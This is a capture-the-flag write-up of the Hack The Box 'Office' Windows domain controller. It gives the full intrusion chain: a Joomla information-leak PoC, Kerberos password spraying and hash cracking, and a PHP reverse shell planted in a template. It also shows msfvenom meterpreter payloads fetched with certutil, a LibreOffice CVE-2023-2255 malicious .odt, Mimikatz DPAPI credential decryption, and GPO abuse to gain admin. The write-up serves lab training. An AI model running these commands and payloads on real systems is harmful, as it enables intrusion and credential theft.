---
date: 2024-06-19T23:28:44-05:00
# description: ""
image: "/images/HTB-Office/Office.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Office"
type: "post"
---

* Platform: Hack The Box
* Link: [Office](https://app.hackthebox.com/machines/Office)
* Level: Hard
* OS: Windows
---

The Office box is a Windows Server 2022 running as a domain controller. The website hosted on the web server uses an outdated version of Joomla, which is vulnerable to `CVE-2023-23752`. By exploiting this vulnerability, we leak the MySQL database password. After some enumeration, we find a valid username for the password, granting us access to a shared folder containing a pcap file.

Loading the pcap file into Wireshark, we discover an `AS-REQ` frame containing all the necessary information to construct a hash. Using hashcat, we recover a password that allows us to access the Joomla Dashboard. By inserting a PHP reverse shell into a Joomla template, we obtain our initial foothold. From this first shell, we move laterally to another user and retrieve the user flag.

Using Bloodhound, we learn that one of the users has the `CanPSRemote` permission and is also a member of the `GPO Managers` group. We achieve another lateral movement by exploiting an outdated version of LibreOffice via `CVE-2023-2255`, uploading a malicious `.odt` file to an internal website. Our final lateral movement is accomplished by decrypting some DPAPI credential files with Mimikatz, which yields the password of the user with the loose permissions. Finally, we exploit the lax configuration by adding the user to the Administrators group, allowing us to read the root flag.

Target IP address - `10.10.11.3`

## Scanning

A bash script is used for the scanning process, you can find it [here](https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh).

```
./nmap_scan.sh 10.10.11.3 Office
```

```shell
Running detailed scan on open ports: 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49668,51552,51567,51587,51639
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:30 CDT
Nmap scan report for office.htb (10.10.11.3)
Host is up (0.066s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-20 13:30:27Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51552/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51567/tcp open  msrpc         Microsoft Windows RPC
51587/tcp open  msrpc         Microsoft Windows RPC
51639/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-20T13:31:17
|_  start_date: N/A
|_clock-skew: mean: 7h59m42s, deviation: 0s, median: 7h59m41s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.29 seconds
```

We are dealing with a domain controller named `office.htb`. Let's update the `/etc/hosts` file.

```
sudo echo "10.10.11.3 office.htb dc.office.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Visiting `http://office.htb/` we find a blog about Iron Man armors. 

![Office blog website](/images/HTB-Office/office-blog.png)

Thanks to wappalyzer we find out that the website uses Joomla. We could search for vulnerabilities for that CMS but without a software version we are playing a guessing game.

![Office - Wappalyzer results](/images/HTB-Office/wappalyzer.png)

We recall that we saw a `robots.txt` file in the nmap results.

![Office - robots.txt](/images/HTB-Office/robots-txt.png)

Several directories are discovered.

![robots.txt directories](/images/HTB-Office/endpoints-found.png)

`http://office.htb/administrator/` leads us to the Joomla Administrator Login page; however, we still lack the credentials.

![Joomla admin panel](/images/HTB-Office/Joomla-admin-login.png)

On [this](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version) HackTricks page we learn a few ways to obtain the version of Joomla and we obtain it by going to `http://office.htb//administrator/manifests/files/joomla.xml`.

![Joomla version](/images/HTB-Office/Joomla-version.png)

For this version we find [CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce) which is an information leakage vulnerability. A PoC is available [here](https://github.com/0xNahim/CVE-2023-23752).

After running `python3 exploit.py -u http://office.htb` we get the MySQL root password `H0lOgrams4reTakIng0Ver754!`.

![DB password recovered](/images/HTB-Office/joomla-creds.png)

Trying to login with `administrator:H0lOgrams4reTakIng0Ver754!` fails, so we need to find another way to use this password. We know from the nmap scan results that Kerberos is running on port 88, let's use [kerbrute](https://github.com/ropnop/kerbrute) to enumerate valid accounts. 

```
kerbrute userenum --dc office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

![Valid usernames found with Kerbrute](/images/HTB-Office/valid-users.png)

Now with the list of valid users we can spray the password in order to get a valid username.

```
kerbrute passwordspray --dc office.htb -d office.htb usernames 'H0lOgrams4reTakIng0Ver754!'
```

![Valid credential pair](/images/HTB-Office/login-sucess.png)

We find that `dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!` works.

With impacket we login into smb and we notice a share called `SOC Analysis`, containing a pcap file named `Latest-System-Dump-8fbc124d.pcap` which we download.

```
impacket-smbclient dwolfe:'H0lOgrams4reTakIng0Ver754!'@10.10.11.3
```

![SMB login and SOC Analysis share](/images/HTB-Office/share-access.png)

After loading the pcap file and filtering for `kerberos` we discover some valuable information. 

![Kerberos pcap file](/images/HTB-Office/pcap.png)

> When a user requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), a process known as AS-REQ (Authentication Service Request) is used. Part of this process involves the user proving their identity to the KDC. During the AS-REQ, the client (user) sends a timestamp encrypted with their NTLM hash (which is derived from their password). This proves they know the password without sending it directly.

We can extract the password hash from the pcap file and then use hashcat to crack it. Because hashcat has several modules for Kerberos hashes we need to use the correct format. Let's review the information we have:

* The presence of the `PA-DATA` fields, which are used for pre-authentication confirms that we are dealing with Kerberos pre-authentication packets.
* The etype (encryption type) is specified as `18` and it also uses AES-256.
* We have the cipher (NTLM hash) used to encrypt the timestamp.
* We have the user name (`CNameString = tstark`) and the domain name (`realm = OFFICE.HTB`).

With that intel we find that the corresponding hash should follow this format `$krb5pa$18$user$realm$cipher`. It corresponds to module 19900 in hashcat which you can verify [here](https://hashcat.net/wiki/doku.php?id=example_hashes).

We will use a Bash script to get the hash.

```bash
#!/bin/bash
filter=$(tshark -r $1 -Y "kerberos.msg_type == 10 && kerberos.cipher && kerberos.realm && kerberos.CNameString" -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher -E separator=$ )

for i in $(echo $filter | tr ' ' '\n') ; do

    echo "\$krb5pa\$18\$$i"

done
```

![Kerberos hash found](/images/HTB-Office/kerberos-hash.png)

Using hashcat we recover the password `playboy69`.

```
hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![Kerberos hash cracked with hashcat](/images/HTB-Office/hash-cracked.png)

## Initial Foothold

With the credentials `administrator:playboy69` we log into the Joomla dashboard, we are logged in as `Tony Stark`.

![Joomla Dashboard](/images/HTB-Office/joomla-dashboard.png)

As is usual with CMS software, we can modify templates with some custom code. We exploit this to get a reverse shell. Go to `System` --> `Site Templates` --> click `Cassiopeia Details and Files` --> overwrite `error.php` with a PHP reverse shell which you can find on [revshells](https://www.revshells.com/) --> Save and Close --> finally visit `http://office.htb/templates/cassiopeia/error.php` to trigger the reverse shell.

On the listener we get a shell as `web_account`.

![Initial foothold, shell as web_account](/images/HTB-Office/shell-office.png)

### Shell as tstark

We cannot read the user flag with this account but we can switch to the `tstark` user. Since we already have the correct credentials we can use [runascs](https://github.com/antonioCoco/RunasCs) to access the account, we will use a meterpreter shell.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT_NUMBER> -f exe -o payload.exe
```

![malicious file generated with msfvenom](/images/HTB-Office/msfvenom-cmd.png)

After sending both files to the target we set up the handler in Metasploit.

```
certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/RunasCs.exe runascs.exe

certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/payload.exe payload.exe
```

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <IP_ADDRESS>
set lport <PORT_NUMBERS>
run
```

And running RunasCs with our malicious file we get a meterpreter shell.

```
runascs.exe tstark playboy69 payload.exe
```

![runascs command](/images/HTB-Office/runascs-cmd.png)

![tstark meterpreter shell](/images/HTB-Office/tstark-meterpreter.png)

The user flag is found in `C:\Users\tstark\Desktop`.

![user flag location](/images/HTB-Office/user-flag-metasploit.png)

Additionally we notice two more users on the system.

![users directory on target system](/images/HTB-Office/Users-list.png)


#### Active Directory Enumeration

Knowing that we are dealing with a Domain Controller let's use Bloodhound to enumerate.

![Bloodhound command](/images/HTB-Office/bloodhound-cmd.png)

```
bloodhound-python -c all -u tstark -p 'playboy69' -d office.htb -dc dc.office.htb -ns 10.10.11.3
```

After it finishes collecting data, we can launch Bloodhound

```
sudo neo4j start

bloodhound --no-sandbox
```

When Bloodhound launches, we use the `Upload Data` button on the right. 

![Upload data in Bloodhound](/images/HTB-Office/upload-data-bloodhound.png)

Then select all the json files created by Bloodhound and the information will be imported.

![Bloodhound json files](/images/HTB-Office/bloodhound-files.png)

We discover that the `HHogan` user has the `CanPSRemote` permission allowing him to initiate remote sessions on the target. In our case `evil-winrm` can be used for that.

![hhogan CanPSRemote](/images/HTB-Office/hhogan-canpsremote.png)

Moreover this user is also a member of the `GPO Managers` group, indicating that the user has permissions to manage Group Policy Objects (GPOs).

![hhogan is a member of the GPO Managers group](/images/HTB-Office/gpo-managers-membership.png)

Running `netstat` in our meterpreter shell we notice `http` running on port `8083`, which we did not discover with nmap. 

![netstat command](/images/HTB-Office/netstat-cmd.png)

To access it we will use [ligolo-ng](https://github.com/nicocha30/ligolo-ng).

Going to `http://240.0.0.1:8083/` we find a business website for Holography Industries.

![Internal business website](/images/HTB-Office/business-website.png)

Clicking on `Submit Application` leads us to `/resume.php`, a page where we can upload a resume for a job application.

![resume.php page for file submission](/images/HTB-Office/resume-php.png)

Trying to upload a pdf file fails, and we learn that this application only accepts `Doc`, `Docx`, `Docm`, and `Odt` files. 

![file extensions acepted](/images/HTB-Office/files-extensions.png)

The files for this application are found at `C:\xampp\htdocs\internal`.

![Internal files](/images/HTB-Office/internal-files.png)


### Shell as ppotts

The `resume.php` file is owned by the `PPotts` user.

![resume.php file permissions](/images/HTB-Office/resume-php-permissions.png)

We also find that Libre Office version 5.2 is running on the target. 

![Libre Office version](/images/HTB-Office/Libre-Office-version.png)

This is an outdated version vulnerable to [CVE-2023-2255](https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/) with a PoC available [here](https://github.com/elweth-sec/CVE-2023-2255).

We start by crafting a malicious exe file.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=5555 -f exe -o shell.exe
```

Then we use the exploit.

```
python3 CVE-2023-2255.py --cmd 'C:\Users\Public\shell.exe' --output 'exploit.odt'
```

![Malicious odt file](/images/HTB-Office/malicious-odt.png)

A few minutes after placing `shell.exe` at the correct location and uploading our `exploit.odt` file via the internal application we get a new meterpreter shell as `ppotts`.

![ppotts meterpreter shell](/images/HTB-Office/ppotts-shell.png)

### Shell as hhogan

We use `winpeas` to enumerate the target system and we find some DPAPI credentials files.

> DPAPI, which stands for Data Protection API, is a set of cryptographic services built into Windows operating systems. It provides developers with a straightforward way to protect sensitive data, such as passwords, encryption keys, and other confidential information, by encrypting and decrypting data using strong cryptographic algorithms.

![DPAPI master keys](/images/HTB-Office/DPAPI-Master-Keys.png)

![DPAPI credential files](/images/HTB-Office/DPAPI-Credential-Files.png)

Running `cmdkey /list`, we learn that the the user `hhogan` credentials are currently stored on the target. 

![cmdkey command](/images/HTB-Office/cmdkey-cmd.png)

We find the credentials files at the specified address.

```
Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
```

![Credential files location](/images/HTB-Office/Credential-files.png)

We also locate the master keys.

```
Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
```

![Credential files location](/images/HTB-Office/Master-key-files.png)

> DPAPI (Data Protection API) credential files are used by Windows to securely store sensitive information, such as user credentials, passwords, and other secrets. DPAPI provides encryption services that applications can use to protect data, ensuring that it can only be decrypted by the same user who encrypted it or by a user with the correct keys.

We can use Mimikatz to extract passwords from credential files. To decrypt a credential file, we first need to identify which master key was used to encrypt it. Next, we must decrypt the master key, and then use this decrypted master key to decrypt the credential file.

Thanks to winpeas we know that only two out of the three master keys are used for the credential files, the ones ending with `47eb` and `fc7d`.

---
#### Side Note

If we do not know which master key is used to encrypt/decrypt a credential file, we can use Mimikatz to find out.

```
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
```
![Mimikatz command to identify the correct master key used](/images/HTB-Office/master-key-used.png)

---

We will start by decrypting the key that is used by two files (the one ending with `47eb`).

```
dpapi::masterkey /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

![Mimikatz command to decrypt master key](/images/HTB-Office/decrypted-master-key.png)

With the decrypted master key we decrypt the credential file and recover the password `H4ppyFtW183#`.

```
dpapi::cred /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4" /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
```

![hhogan password recovered](/images/HTB-Office/HHogan-password.png)

With the newly found credentials we login via evil-winrm as `hhogan`.

```
evil-winrm -u "HHogan" -p "H4ppyFtW183#" -i dc.office.htb
```

![hhogan shell via evil-winrm](/images/HTB-Office/HHogan-shell.png)

## Privilege Escalation

We use `Get-GPO -All` to list all the GPOs of the domain. We find a few interesting ones but we need to check if this user has the permissions to interact with them. We also note their IDs.

![Default domain policy](/images/HTB-Office/Default-Domain-Policy.png)

![Default DC domain policy](/images/HTB-Office/Default-DC-policy.png)

With [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) we enumerate the GPO permissions. After downloading the script we need to import the module in order to use it.

```
Import-Module ./powerview.ps1
Get-NetGroup -name "GPO Managers"
```

![PowerView used to enumerate the GPO Managers group](/images/HTB-Office/Powerview-GPO-Managers.png)

The `GPO Managers` group has an SID of `S-1-5-21-1199398058-4196589450-691661856-1117`.

We specifically target the `Default Domain Controllers Policy` and enumerate its permissions using PowerView.

```
Get-NetGPO | Where-Object { $_.DisplayName -eq "Default Domain Controllers Policy" } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
```

![Default Domain Controller Policy permissions](/images/HTB-Office/GPO-Permissions.png)

We notice that the listed SID matches the GPO Managers group's SID. Moreover `AceType` and `AceQualifier` are both set to `AccessAllowed`. This data confirms that the members of the `GPO Managers` group can exercise all the permissions they have on the `Default Domain Controllers Policy`.

We exploit this misconfiguration and add `hhogan` to the administrators group with a tool call [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0).

```
.\sharpgpoabuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Controllers Policy"
```

![SharpGPOAbuse command](/images/HTB-Office/sharpgpoabuse-cmd.png)

We update the policy for the task to take effect.

```
gpupdate /force
```

![gpudate command](/images/HTB-Office/gpupdate.png)

Now, we are indeed part of the `Administrators` group. 

![user added to the Administrators group](/images/HTB-Office/administrators-add.png)

All we need to do is log out and log in again to access the administrator's desktop and read the root flag.

![Root flag location](/images/HTB-Office/root-flag.png)

## Closing Words

That's it for my first write up for a Hard box on HackTheBox! I have to admit the bump in difficulty and scope from Medium is very noticeable, but I was able to experiment with a lot of new tools during the exploitation of Office. 

Learning Active Directory is a non-negotiable for aspiring security professionals especially on the technical side. I am still learning it but here are a few resources that you can use to deep dive into it:
* TryHackMe gives you access to two AD networks for free as long as you have a 7 days streak minimum, find them [here](https://tryhackme.com/r/hacktivities) in the `Networks` section.
* They also have some free rooms pertaining to Active Directory such as [Active Directory Basics](https://tryhackme.com/r/room/winadbasics), [Attacktive Directory](https://tryhackme.com/r/room/attacktivedirectory), [Ra](https://tryhackme.com/r/room/ra), [Reset](https://tryhackme.com/r/room/resetui), and [Enterprise](https://tryhackme.com/r/room/enterprise).
* HackTheBox Academy has multiple modules on Active Directory, go to [this](https://academy.hackthebox.com/modules) page and search for "active directory" to find them all. 
* If you are a book lover, I highly recommand [Pentesting Active Directory and Windows-based Infrastructure](https://www.amazon.com/Pentesting-Active-Directory-Windows-based-Infrastructure/dp/1804611360).
